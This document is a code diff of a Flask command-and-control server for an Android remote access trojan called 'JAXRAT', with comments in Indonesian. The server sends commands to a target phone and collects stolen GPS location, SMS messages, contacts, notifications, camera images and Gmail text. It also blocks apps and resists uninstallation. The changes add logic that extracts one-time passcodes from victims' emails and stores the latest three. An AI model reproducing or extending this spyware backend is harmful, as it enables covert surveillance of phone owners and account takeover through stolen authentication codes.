@@ -10,7 +10,7 @@ PASSWORD = "jaxrat123"
 
 devices = {"hp_target_1": {"name": "HP Target", "status": "online", "last_seen": "-", "anti_uninstall": True}}
 latest_commands = {"hp_target_1": "none"}
-latest_results = {"hp_target_1": {"gps": "Belum ada data", "sms": [], "contacts": [], "notifs": [], "gmail": "", "otp": ""}}
+latest_results = {"hp_target_1": {"gps": "Belum ada data", "sms": [], "contacts": [], "notifs": [], "gmail": []}}
 
 UPLOAD_FOLDER = os.path.join(app.root_path, 'static', 'uploads')
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
@@ -46,8 +46,7 @@ def receive_command(device_id):
     data = request.json
     cmd = data.get("command")
     latest_commands[device_id] = cmd
-    print(f"[JAXRAT] Perintah masuk: {cmd}")
-    return jsonify({"status": "success", "received": cmd})
+    return jsonify({"status": "success"})
 
 @app.route('/api/get_command/<device_id>', methods=['GET'])
 def get_command(device_id):
@@ -65,13 +64,16 @@ def upload_result(device_id):
         elif tipe == "contacts": latest_results[device_id]["contacts"] = data.get("data")
         elif tipe == "gmail":
             text = data.get("data", "")
-            latest_results[device_id]["gmail"] = text
-            # LOGIKA FILTER OTP (Cari angka 4-6 digit)
-            otp_match = re.findall(r'\b\d{4,6}\b', text)
-            if otp_match:
-                latest_results[device_id]["otp"] = otp_match[0] # Ambil yang pertama ketemu
-                print(f"[SPY] OTP Gmail ditemukan: {otp_match[0]}")
-            print(f"[SPY] Teks Email masuk!")
+            # Cari OTP (4-6 digit angka)
+            otp = re.search(r'\b\d{4,6}\b', text)
+            
+            # Simpan data gmail (max 3)
+            gmail_entry = {"text": text, "otp": otp.group(0) if otp else ""}
+            gmail_list = latest_results[device_id]["gmail"]
+            gmail_list.insert(0, gmail_entry)
+            if len(gmail_list) > 3: gmail_list.pop()
+            
+            print(f"[SPY] Gmail masuk. OTP: {otp.group(0) if otp else 'Tidak ada'}")
     return jsonify({"status": "success"})
 
 @app.route('/api/upload_notification/<device_id>', methods=['POST'])
@@ -81,7 +83,6 @@ def upload_notification(device_id):
         notif_list = latest_results[device_id]["notifs"]
         notif_list.insert(0, data)
         if len(notif_list) > 30: notif_list.pop()
-        print(f"[SPY] Notif masuk: {data.get('app')}")
     return jsonify({"status": "success"})
 
 @app.route('/api/get_results/<device_id>', methods=['GET'])
@@ -97,16 +98,14 @@ def clear_result(device_id, result_type):
         elif result_type == "sms": latest_results[device_id]["sms"] = []
         elif result_type == "contacts": latest_results[device_id]["contacts"] = []
         elif result_type == "notifs": latest_results[device_id]["notifs"] = []
-        elif result_type == "gmail": latest_results[device_id]["gmail"] = ""; latest_results[device_id]["otp"] = ""
+        elif result_type == "gmail": latest_results[device_id]["gmail"] = []
     return jsonify({"status": "success"})
 
 @app.route('/api/set_blocked_apps/<device_id>', methods=['POST'])
 def set_blocked_apps(device_id):
     if not session.get('logged_in'): return jsonify({"status": "error"}), 401
-    data = request.json
-    apps = data.get("apps", "")
+    apps = request.json.get("apps", "")
     latest_commands[device_id] = f"block_apps|{apps}"
-    print(f"[JAXRAT] Update App Blocker: {apps if apps else 'Dilepas semua'}")
     return jsonify({"status": "success"})
 
 @app.route('/api/upload_image/<device_id>', methods=['POST'])
@@ -114,8 +113,7 @@ def upload_image(device_id):
     if 'image' not in request.files: return jsonify({"status": "error"}), 400
     file = request.files['image']
     if file.filename == '': return jsonify({"status": "error"}), 400
-    filepath = os.path.join(UPLOAD_FOLDER, 'latest.jpg')
-    file.save(filepath)
+    file.save(os.path.join(UPLOAD_FOLDER, 'latest.jpg'))
     return jsonify({"status": "success"})
 
 if __name__ == '__main__':
